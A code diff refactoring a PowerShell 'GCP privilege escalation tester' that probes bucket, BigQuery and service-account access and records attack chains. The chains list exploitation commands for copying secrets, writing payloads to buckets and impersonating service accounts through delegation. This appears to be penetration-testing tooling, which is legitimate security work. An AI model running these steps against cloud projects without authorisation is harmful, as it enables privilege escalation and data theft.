@@ -1314,33 +1462,63 @@ function Test-StorageAccess {
                         }
                     }
                     Save-Output "$dir\bucket_listing_$bucket.txt" ($allObjects -join "`n")
-                } catch {}
+                }
+                catch { }
             }
 
             $severity = if ($canWrite) { "HIGH" } elseif ($interestingFiles.Count -gt 0) { "HIGH" } else { "MEDIUM" }
+
+            # Build steps
+            $steps = @("Confirmed $accessStr access to bucket gs://$bucket")
+            if ($interestingFiles.Count -gt 0) {
+                $steps += "Found $($interestingFiles.Count) potentially sensitive files"
+            }
+            else {
+                $steps += "No obvious sensitive files in top-level listing"
+            }
+            if ($canWrite) {
+                $steps += "WRITE access enables: injecting malicious scripts into deployment pipelines, tampering with Terraform state, poisoning data, or planting backdoors"
+            }
+            if ($canRead -and $interestingFiles.Count -gt 0) {
+                $topFiles = ($interestingFiles | Select-Object -First 10 | ForEach-Object { ($_ -split '/')[-1] }) -join ', '
+                $steps += "Interesting files: $topFiles"
+            }
+
+            # Build commands
+            $commands = @(
+                "gsutil ls -r gs://$bucket/",
+                "gsutil cp gs://$bucket/path/to/secret.json ."
+            )
+            if ($canWrite) {
+                $commands += "gsutil cp payload.txt gs://$bucket/payload.txt"
+            }
+
+            $impactExtra = ""
+            if ($interestingFiles.Count -gt 0) {
+                $impactExtra = " $($interestingFiles.Count) interesting files found."
+            }
+
+            if ($canWrite) {
+                $privStr = "Write access - potential for supply chain attack, data tampering, or deploying malicious objects"
+            }
+            else {
+                $privStr = "Read access - potential for data exfiltration and credential discovery"
+            }
 
             Record-Chain -ChainID $chainID -Project $Project `
                 -Title "Bucket Access ($accessStr): gs://$bucket" `
                 -Severity $severity `
                 -InitialAccess "Current identity has $accessStr on gs://$bucket" `
-                -TargetPrivilege "$(if ($canWrite) {'Write access — potential for supply chain attack, data tampering, or deploying malicious objects'} else {'Read access — potential for data exfiltration and credential discovery'})" `
-                -Steps @(
-                    "Confirmed $accessStr access to bucket gs://$bucket",
-                    "$(if ($interestingFiles.Count -gt 0) { "Found $($interestingFiles.Count) potentially sensitive files" } else { 'No obvious sensitive files in top-level listing' })",
-                    "$(if ($canWrite) { 'WRITE access enables: injecting malicious scripts into deployment pipelines, tampering with Terraform state, poisoning data, or planting backdoors' })",
-                    "$(if ($canRead -and $interestingFiles.Count -gt 0) { 'Interesting files: ' + ($interestingFiles | Select-Object -First 10 | ForEach-Object { ($_ -split '/')[-1] }) -join ', ' })"
-                ) `
-                -Commands @(
-                    "gsutil ls -r gs://$bucket/",
-                    "gsutil cp gs://$bucket/path/to/secret.json .",
-                    "$(if ($canWrite) { "gsutil cp payload.txt gs://$bucket/payload.txt" })"
-                ) `
-                -Impact "Data access on gs://$bucket. $accessStr confirmed. $(if ($interestingFiles.Count -gt 0) { "$($interestingFiles.Count) interesting files found." })"
+                -TargetPrivilege $privStr `
+                -Steps $steps `
+                -Commands $commands `
+                -Impact "Data access on gs://$bucket. $accessStr confirmed.$impactExtra"
 
             if ($interestingFiles.Count -gt 0) {
                 Save-Output "$dir\interesting_files_$bucket.json" @($interestingFiles)
             }
-        } else {
+        }
+        else {
             Write-Log "    No access to gs://$bucket" "FAIL"
         }
     }
@@ -1363,8 +1541,8 @@ function Test-BigQueryAccess {
 
         try {
             $tablesRaw = bq ls --format=json "${Project}:${ds}" 2>&1
-            $tablesErr = ($tablesRaw | Where-Object { $_ -is [System.Management.Automation.ErrorRecord] }) -join ""
-            $tablesOut = ($tablesRaw | Where-Object { $_ -isnot [System.Management.Automation.ErrorRecord] }) -join ""
+            $tablesErr = @($tablesRaw | Where-Object { $_ -is [System.Management.Automation.ErrorRecord] }) -join ""
+            $tablesOut = @($tablesRaw | Where-Object { $_ -isnot [System.Management.Automation.ErrorRecord] }) -join ""
 
             if (-not ($tablesErr -match "Access Denied|403") -and $tablesOut) {
                 $tables = $tablesOut | ConvertFrom-Json
@@ -1378,32 +1556,43 @@ function Test-BigQueryAccess {
                     $sampleTable = $tblName
                     try {
                         $qResult = bq query --format=json --max_rows=1 --use_legacy_sql=false "SELECT * FROM ``$Project.$ds.$tblName`` LIMIT 1" 2>&1
-                        $qOut = ($qResult | Where-Object { $_ -isnot [System.Management.Automation.ErrorRecord] }) -join ""
-                        if ($qOut) { $sampleResult = "Query succeeded — data readable" }
-                    } catch {}
+                        $qOut = @($qResult | Where-Object { $_ -isnot [System.Management.Automation.ErrorRecord] }) -join ""
+                        if ($qOut) { $sampleResult = "Query succeeded - data readable" }
+                    }
+                    catch { }
                 }
+
+                $tableNames = ($tables | ForEach-Object { $_.tableReference.tableId }) -join ', '
+
+                $steps = @(
+                    "Listed $($tables.Count) tables in dataset ${Project}:${ds}",
+                    "Tables: $tableNames"
+                )
+                if ($sampleResult) {
+                    $steps += "Sample query on table ${sampleTable}: $sampleResult"
+                }
+
+                $commands = @(
+                    "bq ls ${Project}:${ds}",
+                    "bq query --use_legacy_sql=false 'SELECT * FROM ``$Project.$ds.TABLE_NAME`` LIMIT 100'"
+                )
 
                 Record-Chain -ChainID $chainID -Project $Project `
                     -Title "BigQuery Dataset Accessible: $ds ($($tables.Count) tables)" `
                     -Severity "MEDIUM" `
                     -InitialAccess "Current identity has bigquery.tables.list (and possibly .getData) on $ds" `
                     -TargetPrivilege "Read access to $($tables.Count) BigQuery tables in dataset $ds. $sampleResult" `
-                    -Steps @(
-                        "Listed $($tables.Count) tables in dataset ${Project}:${ds}",
-                        "Tables: $(($tables | ForEach-Object { $_.tableReference.tableId }) -join ', ')",
-                        "$(if ($sampleResult) { "Sample query on table $sampleTable: $sampleResult" })"
-                    ) `
-                    -Commands @(
-                        "bq ls ${Project}:${ds}",
-                        "bq query --use_legacy_sql=false 'SELECT * FROM ``$Project.$ds.TABLE_NAME`` LIMIT 100'"
-                    ) `
+                    -Steps $steps `
+                    -Commands $commands `
                     -Impact "Data access: $($tables.Count) tables in $ds. May contain PII, credentials, business data."
 
                 Save-Output "$dir\tables_$ds.json" $tables
-            } else {
+            }
+            else {
                 Write-Log "    DENIED: Cannot access $ds" "FAIL"
             }
-        } catch {
+        }
+        catch {
             Write-Log "    Error accessing $ds : $_" "ERROR"
         }
     }
@@ -1421,12 +1610,13 @@ function Test-DelegationChains {
     if (-not $SAs -or $SAs.Count -lt 2) { return }
 
     # Build a graph: for each SA, who can impersonate it?
-    $graph = @{}   # target_sa -> @(source_identities)
+    $graph = @{}
     $projData = $Script:Manifest.projects[$Project]
 
     foreach ($sa in $SAs) {
         $saEmail = $sa.email
-        $saPolicyFile = "$EnumDir\$Project\service_accounts\sa_policy_$($saEmail -replace '[^a-zA-Z0-9]','_').json"
+        $safeEmail = $saEmail -replace '[^a-zA-Z0-9]', '_'
+        $saPolicyFile = "$EnumDir\$Project\service_accounts\sa_policy_$safeEmail.json"
         if (Test-Path $saPolicyFile) {
             try {
                 $raw = Get-Content $saPolicyFile -Raw
@@ -1443,7 +1633,8 @@ function Test-DelegationChains {
                         }
                     }
                 }
-            } catch {}
+            }
+            catch { }
         }
     }
 
@@ -1458,38 +1649,59 @@ function Test-DelegationChains {
     foreach ($targetSA in $graph.Keys) {
         $targetRoles = Get-SARolesOnProject -SAEmail $targetSA -Project $Project
         $targetIsPriv = $targetRoles -match "owner|editor|admin"
-        $targetRolesStr = if ($targetRoles) { Format-RolesWithPerms -Roles $targetRoles } else { "(no project-level roles found)" }
+        if ($targetRoles -and $targetRoles.Count -gt 0) {
+            $targetRolesStr = Format-RolesWithPerms -Roles $targetRoles
+        }
+        else {
+            $targetRolesStr = "(no project-level roles found)"
+        }
 
         foreach ($source in $graph[$targetSA]) {
             $sourceMember = $source.member
             $sourceRolePerms = Get-RolePrivEscPerms -Role $source.role
-            $sourceRolePermStr = if ($sourceRolePerms.Count -gt 0) { " (privesc: $($sourceRolePerms -join ', '))" } else { "" }
+            $sourceRolePermStr = ""
+            if ($sourceRolePerms.Count -gt 0) {
+                $permList = $sourceRolePerms -join ', '
+                $sourceRolePermStr = " (privesc: $permList)"
+            }
 
-            # Check if source is itself an SA that someone else can impersonate (multi-hop)
-            $sourceEmail = $sourceMember -replace '^serviceAccount:',''
+            # Multi-hop: check if source is itself an SA that someone else can impersonate
+            $sourceEmail = $sourceMember -replace '^serviceAccount:', ''
             if ($graph.ContainsKey($sourceEmail)) {
                 foreach ($hop2Source in $graph[$sourceEmail]) {
                     $hop2RolePerms = Get-RolePrivEscPerms -Role $hop2Source.role
-                    $hop2RolePermStr = if ($hop2RolePerms.Count -gt 0) { " (privesc: $($hop2RolePerms -join ', '))" } else { "" }
+                    $hop2RolePermStr = ""
+                    if ($hop2RolePerms.Count -gt 0) {
+                        $hop2PermList = $hop2RolePerms -join ', '
+                        $hop2RolePermStr = " (privesc: $hop2PermList)"
+                    }
                     $chainNum++
                     $chainID = "DELEGATION-$Project-$chainNum"
+                    $severity = if ($targetIsPriv) { "CRITICAL" } else { "HIGH" }
+
+                    $steps = @(
+                        "Hop 1: $($hop2Source.member) has $($hop2Source.role)$hop2RolePermStr on $sourceEmail",
+                        "Hop 2: $sourceMember has $($source.role)$sourceRolePermStr on $targetSA",
+                        "Target SA roles: $targetRolesStr",
+                        "Via implicit delegation, the initial identity can obtain a token as $targetSA"
+                    )
+                    $commands = @(
+                        "# Multi-hop impersonation using delegation",
+                        "gcloud auth print-access-token --impersonate-service-account=$targetSA --delegates=$sourceEmail"
+                    )
+                    $impactStr = "Multi-hop privilege escalation via SA delegation chain."
+                    if ($targetIsPriv) {
+                        $impactStr += " Target SA has elevated privileges: $targetRolesStr"
+                    }
 
                     Record-Chain -ChainID $chainID -Project $Project `
                         -Title "Multi-Hop Delegation Chain to $targetSA" `
-                        -Severity $(if ($targetIsPriv) { "CRITICAL" } else { "HIGH" }) `
+                        -Severity $severity `
                         -InitialAccess "$($hop2Source.member) can impersonate $sourceEmail via $($hop2Source.role)$hop2RolePermStr" `
                         -TargetPrivilege "Chain: $($hop2Source.member) -> $sourceEmail -> $targetSA (roles: $targetRolesStr)" `
-                        -Steps @(
-                            "Hop 1: $($hop2Source.member) has $($hop2Source.role)$hop2RolePermStr on $sourceEmail",
-                            "Hop 2: $sourceMember has $($source.role)$sourceRolePermStr on $targetSA",
-                            "Target SA roles: $targetRolesStr",
-                            "Via implicit delegation, the initial identity can obtain a token as $targetSA"
-                        ) `
-                        -Commands @(
-                            "# Multi-hop impersonation using delegation",
-                            "gcloud auth print-access-token --impersonate-service-account=$targetSA --delegates=$sourceEmail"
-                        ) `
-                        -Impact "Multi-hop privilege escalation via SA delegation chain. $(if ($targetIsPriv) { "Target SA has elevated privileges: $targetRolesStr" })"
+                        -Steps $steps `
+                        -Commands $commands `
+                        -Impact $impactStr
                 }
             }
 
@@ -1497,20 +1709,29 @@ function Test-DelegationChains {
             if ($sourceMember -match [regex]::Escape($Script:Manifest.caller_account)) {
                 $chainNum++
                 $chainID = "DELEGATION-$Project-$chainNum"
+                $severity = if ($targetIsPriv) { "CRITICAL" } else { "MEDIUM" }
+
+                $steps = @(
+                    "Current identity is granted $($source.role)$sourceRolePermStr on $targetSA",
+                    "Can directly impersonate this SA via getAccessToken or actAs",
+                    "Target SA roles: $targetRolesStr"
+                )
+                $commands = @(
+                    "gcloud auth print-access-token --impersonate-service-account=$targetSA"
+                )
+                $impactStr = "Direct SA impersonation."
+                if ($targetIsPriv) {
+                    $impactStr += " Target SA has: $targetRolesStr - this is a significant escalation."
+                }
+
                 Record-Chain -ChainID $chainID -Project $Project `
                     -Title "Direct Impersonation Path to $targetSA" `
-                    -Severity $(if ($targetIsPriv) { "CRITICAL" } else { "MEDIUM" }) `
+                    -Severity $severity `
                     -InitialAccess "Current identity ($sourceMember) has $($source.role)$sourceRolePermStr on $targetSA" `
                     -TargetPrivilege "Direct impersonation of $targetSA (roles: $targetRolesStr)" `
-                    -Steps @(
-                        "Current identity is granted $($source.role)$sourceRolePermStr on $targetSA",
-                        "Can directly impersonate this SA via getAccessToken or actAs",
-                        "Target SA roles: $targetRolesStr"
-                    ) `
-                    -Commands @(
-                        "gcloud auth print-access-token --impersonate-service-account=$targetSA"
-                    ) `
-                    -Impact "Direct SA impersonation. $(if ($targetIsPriv) { "Target SA has: $targetRolesStr — this is a significant escalation." })"
+                    -Steps $steps `
+                    -Commands $commands `
+                    -Impact $impactStr
             }
         }
     }
@@ -1555,28 +1776,53 @@ function Test-CrossProjectChains {
 
     $chainNum = 0
     foreach ($saEmail in $saToProjects.Keys) {
-        $projects = $saToProjects[$saEmail] | Select-Object -Unique
+        $projects = @($saToProjects[$saEmail] | Select-Object -Unique)
         if ($projects.Count -gt 1) {
             $rolesByProject = @{}
             foreach ($p in $projects) {
                 $key = "${saEmail}::${p}"
-                $rolesByProject[$p] = if ($saToRoles.ContainsKey($key)) { $saToRoles[$key] } else { @("(SA defined here)") }
+                if ($saToRoles.ContainsKey($key)) {
+                    $rolesByProject[$p] = $saToRoles[$key]
+                }
+                else {
+                    $rolesByProject[$p] = @("(SA defined here)")
+                }
             }
 
-            $isHighPriv = ($rolesByProject.Values | ForEach-Object { $_ }) -match "owner|editor|admin"
+            $allRolesFlat = $rolesByProject.Values | ForEach-Object { $_ }
+            $isHighPriv = $allRolesFlat -match "owner|editor|admin"
 
             if ($isHighPriv) {
                 $chainNum++
                 $chainID = "XPROJECT-$chainNum"
 
-                $details = $rolesByProject.Keys | ForEach-Object {
-                    $projRoles = $rolesByProject[$_]
-                    $rolesWithPerms = if ($projRoles -and $projRoles[0] -ne "(SA defined here)") {
-                        Format-RolesWithPerms -Roles $projRoles
-                    } else {
-                        $projRoles -join ', '
+                $details = @()
+                foreach ($projKey in $rolesByProject.Keys) {
+                    $projRoles = $rolesByProject[$projKey]
+                    if ($projRoles -and $projRoles[0] -ne "(SA defined here)") {
+                        $rolesWithPerms = Format-RolesWithPerms -Roles $projRoles
                     }
-                    "  $_ : $rolesWithPerms"
+                    else {
+                        $rolesWithPerms = $projRoles -join ', '
+                    }
+                    $details += "  ${projKey} : $rolesWithPerms"
+                }
+
+                $detailsBlock = $details -join "`n"
+                $projectsList = $projects -join ', '
+
+                $steps = @(
+                    "Service account $saEmail is bound to roles in multiple projects:",
+                    $detailsBlock,
+                    "If this SA is compromised in any project (via key theft, impersonation, compute metadata, etc.),",
+                    "the attacker gains the SA's roles in ALL projects where it has bindings",
+                    "This is a cross-project pivot point"
+                )
+                $commands = @("# If you have a key or can impersonate ${saEmail} :")
+                $commands += "gcloud auth activate-service-account $saEmail --key-file=key.json"
+                $commands += "# Then access all projects:"
+                foreach ($p in $projects) {
+                    $commands += "gcloud projects get-iam-policy $p --impersonate-service-account=$saEmail"
                 }
 
                 Record-Chain -ChainID $chainID -Project "CROSS-PROJECT" `
@@ -1584,33 +1830,23 @@ function Test-CrossProjectChains {
                     -Severity "CRITICAL" `
                     -InitialAccess "SA $saEmail has roles in $($projects.Count) projects" `
                     -TargetPrivilege "Compromising this SA in any one project pivots to all $($projects.Count) projects" `
-                    -Steps @(
-                        "Service account $saEmail is bound to roles in multiple projects:",
-                        ($details -join "`n"),
-                        "If this SA is compromised in any project (via key theft, impersonation, compute metadata, etc.),",
-                        "the attacker gains the SA's roles in ALL projects where it has bindings",
-                        "This is a cross-project pivot point"
-                    ) `
-                    -Commands @(
-                        "# If you have a key or can impersonate $saEmail :",
-                        "gcloud auth activate-service-account $saEmail --key-file=key.json",
-                        "# Then access all projects:",
-                        ($projects | ForEach-Object { "gcloud projects get-iam-policy $_ --impersonate-service-account=$saEmail" })
-                    ) `
-                    -Impact "Cross-project pivot. Compromising $saEmail in one project grants access to $($projects.Count) projects: $($projects -join ', ')"
+                    -Steps $steps `
+                    -Commands $commands `
+                    -Impact "Cross-project pivot. Compromising $saEmail in one project grants access to $($projects.Count) projects: $projectsList"
 
-                $crossEntry = "CHAIN $chainID : $saEmail spans $($projects.Count) projects`n$($details -join "`n")`n"
+                $crossEntry = "CHAIN $chainID : $saEmail spans $($projects.Count) projects`n$detailsBlock`n"
                 Add-Content -Path $CrossProjectFile -Value $crossEntry
             }
         }
     }
 
     $defaultSAPattern = "\d+-compute@developer\.gserviceaccount\.com"
-    $computeSAs = $saToProjects.Keys | Where-Object { $_ -match $defaultSAPattern }
+    $computeSAs = @($saToProjects.Keys | Where-Object { $_ -match $defaultSAPattern })
     foreach ($dsa in $computeSAs) {
-        $dsaProjects = $saToProjects[$dsa] | Select-Object -Unique
+        $dsaProjects = @($saToProjects[$dsa] | Select-Object -Unique)
         if ($dsaProjects.Count -gt 1) {
-            Add-Content -Path $CrossProjectFile -Value "WARNING: Default compute SA $dsa appears in $($dsaProjects.Count) projects: $($dsaProjects -join ', ')`n"
+            $dsaProjectsList = $dsaProjects -join ', '
+            Add-Content -Path $CrossProjectFile -Value "WARNING: Default compute SA $dsa appears in $($dsaProjects.Count) projects: $dsaProjectsList`n"
         }
     }
 
@@ -1625,7 +1861,12 @@ function Test-CrossProjectChains {
 Write-Host ""
 Write-Host "================================================================" -ForegroundColor White
 Write-Host "  GCP PRIVILEGE ESCALATION TESTER" -ForegroundColor Magenta
-Write-Host "  Mode: $Mode" -ForegroundColor $(if ($Mode -eq "Aggressive") {"Red"} elseif ($Mode -eq "Probe") {"Cyan"} else {"Yellow"})
+$modeColor = switch ($Mode) {
+    "Aggressive" { "Red" }
+    "Probe"      { "Cyan" }
+    default      { "Yellow" }
+}
+Write-Host "  Mode: $Mode" -ForegroundColor $modeColor
 Write-Host "  Enum Dir: $EnumDir" -ForegroundColor White
 Write-Host "  Output: $OutputDir" -ForegroundColor White
 Write-Host "================================================================" -ForegroundColor White
@@ -1652,24 +1893,26 @@ if (-not (Test-Path $manifestPath)) {
 }
 
 $Script:Manifest = Get-Content $manifestPath -Raw | ConvertFrom-Json
-# Convert projects from PSCustomObject to hashtable for easier access
+
+# Convert projects from PSCustomObject to hashtable
 $projectsHT = @{}
 $Script:Manifest.projects.PSObject.Properties | ForEach-Object { $projectsHT[$_.Name] = $_.Value }
-# Re-assign
 $manifestProjects = $projectsHT
 
-# Load role permissions from manifest (populated by enumerator's Resolve-RolePermissions)
+# Load role permissions from manifest
 if ($Script:Manifest.role_permissions) {
     $Script:Manifest.role_permissions.PSObject.Properties | ForEach-Object {
         $roleData = @{}
         if ($_.Value.privesc_permissions) {
             $roleData["privesc_permissions"] = @($_.Value.privesc_permissions)
-        } else {
+        }
+        else {
             $roleData["privesc_permissions"] = @()
         }
         if ($_.Value.permissions) {
             $roleData["permissions"] = @($_.Value.permissions)
-        } else {
+        }
+        else {
             $roleData["permissions"] = @()
         }
         $roleData["total_permissions"] = $_.Value.total_permissions
@@ -1681,10 +1924,11 @@ if ($Script:Manifest.role_permissions) {
 Write-Log "Loaded manifest: $($manifestProjects.Count) projects, caller=$($Script:Manifest.caller_account)"
 
 # Filter projects if specified
-$targetProjectList = if ($TargetProjects) {
-    $TargetProjects -split ',' | ForEach-Object { $_.Trim() }
-} else {
-    $manifestProjects.Keys
+if ($TargetProjects) {
+    $targetProjectList = $TargetProjects -split ',' | ForEach-Object { $_.Trim() }
+}
+else {
+    $targetProjectList = @($manifestProjects.Keys)
 }
 
 # Create output structure
@@ -1698,6 +1942,7 @@ Set-Content -Path $CreatedArtifactsFile -Value "Created Artifacts Tracking`n"
 
 # ---- Phase 1: Per-Project Permission Probing & Testing ----
 $projIndex = 0
+$projTotal = @($targetProjectList).Count
 foreach ($projName in $targetProjectList) {
     $projIndex++
     $projData = $manifestProjects[$projName]
@@ -1706,11 +1951,11 @@ foreach ($projName in $targetProjectList) {
         continue
     }
 
-    $pct = [math]::Round(($projIndex / @($targetProjectList).Count) * 100)
+    $pct = [math]::Round(($projIndex / $projTotal) * 100)
 
     Write-Host ""
     Write-Host "================================================================" -ForegroundColor Yellow
-    Write-Host "  [$projIndex/$(@($targetProjectList).Count)] ($pct%) TESTING: $projName" -ForegroundColor Yellow
+    Write-Host "  [$projIndex/$projTotal] ($pct%) TESTING: $projName" -ForegroundColor Yellow
     Write-Host "================================================================" -ForegroundColor Yellow
 
     $projDir = "$OutputDir\$projName"
@@ -1785,9 +2030,9 @@ Write-Host "  Created Artifacts     : $CreatedArtifactsFile" -ForegroundColor Wh
 Write-Host "  Test Log              : $TestLogFile" -ForegroundColor White
 Write-Host ""
 
-$critChains = ($Script:Chains | Where-Object { $_.severity -eq "CRITICAL" }).Count
-$highChains = ($Script:Chains | Where-Object { $_.severity -eq "HIGH" }).Count
-$medChains  = ($Script:Chains | Where-Object { $_.severity -eq "MEDIUM" }).Count
+$critChains = @($Script:Chains | Where-Object { $_.severity -eq "CRITICAL" }).Count
+$highChains = @($Script:Chains | Where-Object { $_.severity -eq "HIGH" }).Count
+$medChains  = @($Script:Chains | Where-Object { $_.severity -eq "MEDIUM" }).Count
 
 Write-Host "  Confirmed Chains:" -ForegroundColor White
 Write-Host "    CRITICAL : $critChains" -ForegroundColor Red
